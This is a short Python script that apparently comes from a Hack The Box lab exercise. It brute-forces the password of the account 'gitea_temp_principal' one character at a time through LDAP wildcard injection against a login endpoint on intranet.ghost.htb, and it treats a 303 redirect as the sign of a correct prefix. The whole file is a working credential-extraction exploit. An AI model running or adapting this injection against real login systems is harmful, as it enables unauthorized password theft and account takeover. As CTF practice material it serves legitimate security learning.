import requests
import string

username = "gitea_temp_principal"
password = ""
chars = string.printable[:-5]
headers = {"Next-Action": "c471eb076ccac91d6f828b671795550fd5925940"}

while True:
        for c in chars:
                print(f"\rPassword for {username}: {password}{c}", end="")
                files = {
                        "1_ldap-username": (None, username),
                        "1_ldap-secret": (None, f"{password}{c}*"),
                        "0": (None, '[{},"$K1"]'),                                            
                }

                response = requests.post(
                        'http://intranet.ghost.htb:8008/login',
                        headers=headers,
                        files=files
                        )
                if response.status_code == 303:
                        password += c
                        break
        else:
            print()
            break
